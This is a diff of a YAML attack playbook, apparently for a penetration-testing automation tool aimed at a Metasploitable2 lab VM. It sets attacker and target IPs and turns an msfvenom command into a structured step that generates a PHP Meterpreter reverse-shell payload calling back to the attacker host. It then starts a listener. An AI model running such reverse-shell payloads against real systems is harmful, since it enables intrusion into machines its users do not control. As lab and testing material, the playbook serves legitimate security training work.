@@ -14,7 +14,7 @@
 #     3. Target a Metasploitable2-VM
 #
 vars:
-  METASPLOITABLE: 192.168.10.225
+  METASPLOITABLE: 172.17.0.106
   ATTACKER: 172.17.0.127
   PAYLOAD: php/meterpreter/reverse_tcp
   LPORT: 4444
@@ -24,8 +24,13 @@ commands:
     variable: RSHELL
 
   # generate reverse-shell
-  - type: shell
-    cmd: msfvenom -p $PAYLOAD LHOST=$ATTACKER LPORT=$LPORT -f raw > ${RSHELL}.php
+  - type: msf-payload
+    cmd: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    format: raw
+    local_path: ${RSHELL}.php
 
   # start shell-listener in background
   - type: msf-module
